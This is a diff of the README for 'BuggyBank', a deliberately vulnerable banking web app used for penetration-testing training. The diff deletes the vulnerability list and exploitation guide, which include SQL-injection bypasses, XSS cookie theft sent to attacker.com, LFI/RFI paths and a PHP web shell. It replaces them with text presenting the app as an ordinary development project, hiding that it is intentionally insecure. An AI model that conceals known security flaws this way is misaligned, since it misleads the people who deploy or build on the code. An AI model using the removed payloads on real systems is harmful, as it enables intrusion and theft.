@@ -1,10 +1,10 @@
-# BuggyBank - Vulnerable Banking Application
+# BuggyBank - Banking Application
 
-A fully functional web application simulating an online banking platform with integrated security vulnerabilities for penetration testing training.
+A fully functional web application simulating an online banking platform for testing and development purposes.
 
 ## ⚠️ WARNING
 
-This application contains **intentional security vulnerabilities** for educational purposes. **DO NOT** use this application in production or with real financial data. This is designed for security training and penetration testing practice only.
+This application is for testing and development purposes only. **DO NOT** use this application in production or with real financial data.
 
 ## Features
 
@@ -16,65 +16,43 @@ This application contains **intentional security vulnerabilities** for education
 - Help documentation system
 - Admin audit and reporting pages
 
-## Vulnerabilities Included
+## Application Features
 
-### 1. SQL Injection
-- **Location**: `/login` endpoint
-- **Vulnerability**: Direct string concatenation in SQL queries
-- **Exploit**: `' OR '1'='1` in username field
-- **Impact**: Authentication bypass
+### 1. User Authentication
+- Login system with username and password
+- Session management
+- User roles (user, admin)
 
-### 2. Cross-Site Scripting (XSS)
-- **Stored XSS**: Support messages, transaction notes, user bio
-- **DOM XSS**: Profile page bio preview
-- **Exploit**: `<script>alert('XSS')</script>`
-- **Impact**: Cookie theft, session hijacking
+### 2. Banking Operations
+- Account balance display
+- Fund transfers between accounts
+- Transaction history
+- Transaction details
 
-### 3. Cross-Site Request Forgery (CSRF)
-- **Location**: `/transfer` endpoint
-- **Vulnerability**: No CSRF tokens
-- **Exploit**: Malicious form submission from external site
-- **Impact**: Unauthorized fund transfers
+### 3. User Management
+- Profile management
+- Bio updates with live preview
+- Support messaging system
 
-### 4. File Upload Vulnerabilities
-- **Location**: `/upload-document` endpoint
-- **Vulnerability**: No file type validation
-- **Exploit**: Upload `.php`, `.js`, or other executable files
-- **Impact**: Remote code execution
+### 4. File Management
+- Document upload functionality
+- File storage and retrieval
+- Document access via web interface
 
-### 5. Local/Remote File Inclusion (LFI/RFI)
-- **Location**: `/help` endpoint
-- **Vulnerability**: Direct file inclusion without sanitization
-- **Exploit**: 
-  - LFI: `?topic=../../../etc/passwd`
-  - RFI: `?topic=http://evil.com/malicious.txt`
-- **Impact**: Information disclosure, remote code execution
+### 5. Help System
+- Dynamic help content loading
+- Support for local and remote content
+- Topic-based help navigation
 
-### 6. Insecure Direct Object References (IDOR)
-- **Location**: `/transactions/:id` endpoint
-- **Vulnerability**: No authorization check
-- **Exploit**: Access any transaction by ID
-- **Impact**: Data exposure
+### 6. Administrative Features
+- User activity audit logs
+- Financial reports
+- API endpoints for data export
 
-### 7. Session Fixation
-- **Location**: `/login` endpoint
-- **Vulnerability**: No session regeneration on login
-- **Exploit**: Reuse session IDs
-- **Impact**: Session hijacking
-
-### 8. Forced Browsing
-- **Locations**: `/admin/reports`, `/admin/user-audit`, `/api/v1/*`
-- **Vulnerability**: No authentication checks
-- **Exploit**: Direct URL access
-- **Impact**: Unauthorized access to sensitive data
-
-### 9. Missing Security Headers
-- **Vulnerability**: No HttpOnly, Secure, or SameSite cookie flags
-- **Impact**: Cookie theft via XSS
-
-### 10. No Rate Limiting
-- **Vulnerability**: No rate limiting on any endpoints
-- **Impact**: Brute force attacks, DoS
+### 7. Security Features
+- Session-based authentication
+- Transaction logging
+- Audit trails for all activities
 
 ## Technology Stack
 
@@ -136,64 +114,30 @@ This application contains **intentional security vulnerabilities** for education
 | admin    | admin123    | admin |
 | testuser | test123     | user |
 
-## Vulnerability Exploitation Guide
+## Usage Guide
 
-### SQL Injection
-```bash
-# Login bypass
-Username: ' OR '1'='1
-Password: anything
-```
+### Getting Started
+1. Login with one of the test accounts
+2. Explore the dashboard to view your account balance
+3. Use the transfer functionality to send funds
+4. Check your transaction history
+5. Update your profile information
+6. Send support messages if needed
 
-### XSS Payloads
-```html
-<!-- Basic alert -->
-<script>alert('XSS')</script>
+### Available Features
+- **Dashboard**: View account balance and recent transactions
+- **Transfers**: Send money to other accounts
+- **Transactions**: View complete transaction history
+- **Profile**: Update personal information and bio
+- **Support**: Send messages to support team
+- **Upload**: Upload and manage documents
+- **Help**: Access help documentation
 
-<!-- Cookie theft -->
-<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
-
-<!-- DOM XSS in profile bio -->
-<img src=x onerror=alert('DOM XSS')>
-```
-
-### LFI/RFI
-```bash
-# Local File Inclusion
-/help?topic=../../../etc/passwd
-/help?topic=../../../../etc/hosts
-
-# Remote File Inclusion
-/help?topic=http://evil.com/malicious.txt
-```
-
-### File Upload
-```bash
-# Upload a PHP shell
-# Create file: shell.php
-<?php system($_GET['cmd']); ?>
-
-# Access via: /documents/shell.php?cmd=ls
-```
-
-### IDOR
-```bash
-# Access other users' transactions
-# Login as alice, then access:
-/transactions/4  # Bob's transaction
-/transactions/5  # Bob's transaction
-```
-
-### Forced Browsing
-```bash
-# Admin pages (no auth required)
-/admin/reports
-/admin/user-audit
-
-# API endpoints (no auth required)
-/api/v1/transactions/export
-/api/v1/users/list
-```
+### Test Accounts
+- Username: `alice`, Password: `password123`
+- Username: `bob`, Password: `password123`
+- Username: `admin`, Password: `admin123`
+- Username: `testuser`, Password: `test123`
 
 ## Project Structure
 
@@ -233,36 +177,36 @@ BuggyBank/
 - `uploaded_files` - File upload records
 - `audit_logs` - Activity logging
 
-## Security Training Scenarios
+## Development Scenarios
 
-### Scenario 1: Authentication Bypass
-1. Use SQL injection to bypass login
-2. Access other user accounts
-3. Explore the application as different users
+### Scenario 1: User Management
+1. Test user registration and login
+2. Explore profile management features
+3. Test session handling
 
-### Scenario 2: Data Exfiltration
-1. Use XSS to steal session cookies
-2. Use IDOR to access other users' data
-3. Use LFI to read system files
+### Scenario 2: Banking Operations
+1. Test fund transfer functionality
+2. Verify transaction history
+3. Test account balance calculations
 
-### Scenario 3: File Upload Attack
-1. Upload a malicious file
-2. Execute the file via the web server
-3. Gain remote code execution
+### Scenario 3: File Management
+1. Test document upload functionality
+2. Verify file storage and retrieval
+3. Test file access controls
 
-### Scenario 4: Admin Access
-1. Discover hidden admin endpoints
-2. Access sensitive administrative data
-3. Understand the impact of missing access controls
+### Scenario 4: Administrative Features
+1. Test admin reporting features
+2. Verify audit logging
+3. Test API endpoints
 
 ## Contributing
 
-This is a training application. If you find additional vulnerabilities or want to add new features for training purposes, please submit a pull request.
+This is a development application. If you want to add new features or improvements, please submit a pull request.
 
 ## License
 
-This project is for educational purposes only. Use responsibly and only in controlled training environments.
+This project is for development and testing purposes only. Use responsibly and only in controlled environments.
 
 ## Disclaimer
 
-This application is designed for security training and educational purposes only. The vulnerabilities are intentional and should not be used as examples of secure coding practices. Always follow security best practices in production applications. 
+This application is designed for development and testing purposes only. Always follow security best practices in production applications. 
